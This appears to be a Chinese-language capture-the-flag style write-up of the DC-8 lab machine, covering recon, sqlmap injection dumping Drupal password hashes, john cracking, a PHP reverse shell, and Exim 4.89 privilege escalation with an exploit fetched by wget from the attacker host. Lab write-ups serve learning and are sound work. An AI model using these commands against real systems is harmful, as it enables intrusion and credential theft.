# DC-8

## 信息收集

### 主机扫描

```shell
nmap -sP 192.168.238.0/24
或
arp-scan -l
```

靶机ip`192.168.238.196`

### 端口扫描

```
nmap -A 192.168.238.196
```

![image-20240303144113927](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303144113927.png)

有22，80端口开着

### 目录扫描

```shell
dirb http://192.168.238.196/ | grep 'CODE:2'
或
dirsearch -u http://192.168.238.196/
```

这里能扫到登录页面，也可以直接看robots.txt

```
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
```

## 漏洞的发现和利用

### SQL注入点

观察url，可能存在sql注入点，sqlmap跑一下，自己先手测一下也可以

这里我加了一个单引号，发现报错了

![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303145725633.png)

老套路，跑数据

```shell
sqlmap -u http://192.168.238.196/?nid=1 --dbs
sqlmap -u http://192.168.238.196/?nid=1 -D d7db --tables
sqlmap -u http://192.168.238.196/?nid=1 -D d7db -T users -C name,pass --dump
```

得到了用户名和密码

```shell
+--------+---------------------------------------------------------+
| name   | pass                                                    |
+--------+---------------------------------------------------------+
| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
+--------+---------------------------------------------------------+
```

### john命令解密

密码是hash加密了的，用john进行解密

```
echo '$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' > 1.txt
```

```
john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

得到密码明文`turtle`，这里只解出来john的密码

尝试登录后台，john用户可以登录上来

### 反弹shell

一顿找，找到了可以解析php的地方。这里可以先用phpinfo进行测试，我测试过了，所以直接弹shell了

![image-20240303151810659](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303151810659.png)

利用python生成一个伪终端，前提是靶机上有python

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 提权

查找一下有suid权限的命令

> **SUID（Set User ID）是Linux文件系统中的一个特殊权限**，它允许文件在执行时以文件所有者的身份运行。这意味着，当一个具有SUID权限的文件被执行时，调用者会获得该文件所有者的权限，即使调用者本身没有足够的权限来执行该文件。
>
> 4000 2000 1000分别表示SUID SGID SBIT
>
> 1.普通文件，文件的权限一般三位，777最高文件权限
> -perm -0777搜索的就是最高权限的文件rwxrwxrwx
> -perm +0777搜索的只要包含rwxrwxrwx任意一个的文件
> 2.特殊文件，包含权限位置四位，7000为最高，即–s–s–t，同样的方法
> -perm -7000搜索的就是最高权限的文件–s–s–t
> -perm +7000搜索的只要包含–s–s–t任意一个的文件，–s — —（4000）、— –s —（2000）、— — –t（1000）等

```shell
www-data@dc-8:/var/www/html$ find / -type f -perm -4000 -print 2>/dev/null    
find / -type f -perm -4000 -print 2>/dev/null
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/umount
/bin/mount
```

发现有个exim4命令

看一下它的版本

```shell
www-data@dc-8:/var/www/html$ exim --version
exim --version
Exim version 4.89 #2 built 14-Jun-2017 05:03:07
```

在kali上搜一下，看一下有没有这个版本漏洞
![image-20240303154128715](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303154128715.png)

发现有一个46996.sh符合

将脚本下载到靶机上

```shell
wget 192.168.238.70/dc-8.sh -P /tmp
```

查看源码，使用方法

![image-20240303154702814](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303154702814.png)

这里使用netcat方式

```shell
www-data@dc-8:/tmp$ ./dc-8.sh -m netcat
```

成功提权后，一分多钟就回到原来权限，但也够用了

## 总结

> SUID（Set User ID）是Linux文件系统中的一个特殊权限
>
> `find / -type f -perm -4000 -print 2>/dev/null `查找有suid权限的文件
>
> `python -c 'import pty; pty.spawn("/bin/bash")'`生成一个伪终端
>
> 涉及到的知识点：
>
> SQL注入，john命令，php反弹shell，exim4的提权